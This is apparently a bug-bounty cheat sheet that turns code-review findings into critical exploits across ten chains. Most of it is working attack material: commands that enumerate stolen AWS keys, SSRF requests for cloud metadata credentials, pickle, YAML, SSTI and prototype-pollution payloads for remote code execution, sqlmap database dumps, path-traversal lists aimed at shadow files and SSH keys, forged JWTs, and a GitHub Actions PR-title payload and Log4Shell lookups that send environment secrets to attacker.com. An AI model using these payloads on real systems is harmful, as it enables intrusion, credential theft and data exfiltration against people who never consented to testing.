# Chain Escalation — Code Bug → Critical Payout

## The Code Review Hunter's Maxim
> A single bug in code is a finding. A chain from code → live exploit → impact is a payday.
> Every SAST finding must answer: "What HTTP endpoint triggers this? What's the blast radius?"

## Chain 1: Hardcoded Secret → Cloud Takeover
```
CODE FINDING:
  grep/trufflehog finds: AKIA... (AWS Access Key ID) + secret
  File: config/production.rb or .env.production

DYNAMIC EXPLOIT:
  export AWS_ACCESS_KEY_ID=AKIA...
  export AWS_SECRET_ACCESS_KEY=...
  aws sts get-caller-identity    # who am I?
  aws iam list-attached-user-policies --user-name <username>
  aws s3 ls                      # what buckets?
  aws ec2 describe-instances     # what infrastructure?
  aws iam list-users             # full user list?
  aws secretsmanager list-secrets # more secrets!

IMPACT: Full cloud account access → Critical
REPORT: Include sts get-caller-identity output as PoC, redact key
```

## Chain 2: SSRF (Code) → Cloud Metadata → Secret Theft
```
CODE FINDING:
  Python: requests.get(request.args.get('url'))
  Node: axios.get(req.body.target)
  Java: new URL(input).openConnection()

DYNAMIC EXPLOIT:
  # Test SSRF
  curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
  
  # Cloud metadata endpoints:
  AWS:  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE
  GCP:  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
  Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
  
  # If successful: extract cloud credentials from response
  # Then: use creds (same as Chain 1)

SEVERITY ESCALATION: SSRF (High) → SSRF+Metadata (Critical)
```

## Chain 3: Python pickle/YAML → RCE
```
CODE FINDING:
  pickle.loads(user_data)        # endpoint that deserializes user input
  yaml.load(request.data)        # YAML without safe_load
  
IDENTIFY ENDPOINT:
  grep -rn "pickle.loads\|yaml.load" . → find which route handles it
  Look for: API endpoint that accepts base64/binary body

EXPLOIT:
  import pickle, os, base64
  
  class RCE:
      def __reduce__(self):
          return (os.system, ('curl https://attacker.com/$(id)',))
  
  payload = base64.b64encode(pickle.dumps(RCE())).decode()
  # Send to endpoint as body/parameter

YAML RCE:
  payload: "!!python/object/apply:os.system ['curl https://attacker.com/$(id)']"

IMPACT: Remote Code Execution on server → Critical
```

## Chain 4: SQLi (Code) → Data Exfiltration → High Payout
```
CODE FINDING:
  db.query(`SELECT * FROM users WHERE id = ${req.params.id}`)

IDENTIFY ENDPOINT:
  grep -rn "router\|app.get\|app.post" . | grep "users"
  → GET /api/users/:id

DYNAMIC EXPLOIT:
  # Confirm SQLi
  curl "https://target.com/api/users/1 OR 1=1--"
  
  # Enumerate with sqlmap
  sqlmap -u "https://target.com/api/users/1" \
    --dbms=mysql --dbs --tables --dump \
    --risk=2 --level=3
  
  # Manual UNION (check column count first)
  curl "https://target.com/api/users/0 UNION SELECT 1,2,3,4--"
  curl "https://target.com/api/users/0 UNION SELECT user(),database(),version(),4--"

CHAIN WITH: If stacked queries allowed → xp_cmdshell (MSSQL) → RCE
IMPACT: Full database dump → Critical (PII, credentials, API keys)
```

## Chain 5: Path Traversal → Config Read → Credential Theft
```
CODE FINDING:
  fs.readFileSync(path.join('/uploads', req.query.file))  # Node
  open('/var/uploads/' + request.args['filename'])         # Python
  
DYNAMIC EXPLOIT:
  # Confirm traversal
  curl "https://target.com/download?file=../../etc/passwd"
  
  # High-value targets:
  ../../etc/passwd
  ../../etc/shadow
  ../../home/ubuntu/.ssh/id_rsa
  ../../var/www/html/.env
  ../../app/config/database.yml
  ../../proc/self/environ          # environment variables
  ../../proc/self/cmdline          # process command line
  ../../../root/.bash_history
  ../../app/.env.production

CHAIN WITH: path traversal (read) + file write endpoint → webshell
```

## Chain 6: SSTI (Template Injection) → RCE
```
CODE FINDING:
  Flask: render_template_string(request.args.get('template'))
  Jinja2: Template(user_input).render()
  Twig (PHP): $twig->render(user_input)

DYNAMIC EXPLOIT:
  # Detect SSTI
  curl "https://target.com/render?template={{7*7}}"  → 49 = vulnerable!
  
  # Jinja2 RCE
  {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
  {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
  
  # Twig RCE
  {{['id']|filter('system')}}
  {{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
  
  # Freemarker (Java)
  <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

IMPACT: RCE → Critical
```

## Chain 7: JWT (alg=none or RS256→HS256) → Auth Bypass → Admin Access
```
CODE FINDING:
  jwt.decode(token, verify=False)          # Python
  jwt.verify(token, {algorithms: ['none']}) # Node
  // Missing algorithm restriction in verify()

DYNAMIC EXPLOIT:
  # Decode JWT (no verification needed)
  import jwt, base64, json
  
  # Method 1: alg=none
  header = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
  payload = base64.b64encode(json.dumps({"user":"admin","role":"admin"}).encode()).decode().rstrip('=')
  token = f"{header}.{payload}."   # no signature
  
  # Method 2: RS256→HS256 confusion
  # If public key available: sign with HMAC using public key as secret
  public_key = open('pubkey.pem').read()
  token = jwt.encode({"role": "admin"}, public_key, algorithm="HS256")

CHAIN WITH: JWT bypass → access admin endpoints → data exfil or RCE
```

## Chain 8: GitHub Actions Injection → CI/CD RCE → Secrets Exfil
```
CODE FINDING:
  # .github/workflows/ci.yml
  on: pull_request_target    # runs with repo secrets on fork PRs!
  jobs:
    test:
      steps:
        - run: echo "${{ github.event.pull_request.title }}"
        # ^^^ Attacker controls PR title → code injection
  
EXPLOIT:
  # Create PR with title:
  title: "fix: $(curl https://attacker.com/$(env | base64 | tr -d '\n'))"
  # OR for JS:
  title: "fix\"; curl https://attacker.com -d $(env | base64); echo \""
  
  # Exfiltrate: GITHUB_TOKEN, AWS_SECRET, NPM_TOKEN, etc.

IMPACT: CI/CD secrets stolen → push to repo / cloud access → Critical
REFERENCES: CVE class: GitHub Actions script injection
```

## Chain 9: Prototype Pollution → RCE (Node.js)
```
CODE FINDING:
  const merged = _.merge({}, JSON.parse(req.body))
  // Or: obj[key] = value without key sanitization
  
TEST:
  # Send: {"__proto__": {"polluted": true}}
  # Then check: ({}).polluted === true
  
CHAIN TO RCE (if using child_process):
  # Pollute NODE_OPTIONS or shell option used by exec()
  {"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--require /tmp/pwn.js"}}
  
  # Or via ejs template engine (CVE-2022-29078):
  {"__proto__": {"outputFunctionName": "x; process.mainModule.require('child_process').execSync('id')//"}

IMPACT: RCE if chain is reachable → Critical
```

## Chain 10: Dependency CVE → Working Exploit
```
SCA FINDING:
  log4j 2.14.1 in pom.xml → CVE-2021-44228 (Log4Shell)
  spring-core 5.3.17 → CVE-2022-22965 (Spring4Shell)
  struts2 2.5.28 → CVE-2023-50164
  
VERIFY REACHABILITY:
  grep -rn "log4j\|LogManager\|Logger.getLogger" src/
  grep -rn "logger.error\|logger.info\|logger.debug" src/ | head
  # Is user input ever logged? → likely yes in auth/error handlers

DYNAMIC EXPLOIT (Log4Shell):
  # Start JNDI exploit server
  java -jar JNDIExploit.jar -i 0.0.0.0
  
  # Test (user-agent logged → common)
  curl -H 'User-Agent: ${jndi:ldap://attacker.com:1389/exploit}' \
    https://target.com/login
  
  # Check attacker server for callback → RCE

REPORT: Include CVE, version found in pom.xml/package.json, PoC request/response
```

## Severity Decision Framework for Code Bugs

```
CRITICAL (report immediately):
  ✓ RCE via deserialization/template injection/command injection
  ✓ Live hardcoded cloud credentials with significant access
  ✓ SQL injection with sensitive PII table access
  ✓ Authentication bypass affecting all users
  ✓ Exploitable CVE in critical dependency (CVSS 9+)

HIGH:
  ✓ SSRF (without metadata confirmation)
  ✓ Path traversal reading sensitive configs
  ✓ JWT bypass → privilege escalation
  ✓ GitHub Actions injection → secrets exposure
  ✓ Hardcoded API keys (non-cloud but impactful)

MEDIUM:
  ✓ XSS from code-level DOM sinks
  ✓ Open redirect from code
  ✓ Insecure deserialization (no direct RCE path)
  ✓ Dependency with CVSS 7-8 (not directly exploitable)

LOW/INFORMATIONAL:
  ✓ Missing security headers (code-level)
  ✓ Verbose error messages
  ✓ Weak crypto (MD5 for non-auth)
  ✓ TODO/FIXME comments revealing future vuln
```
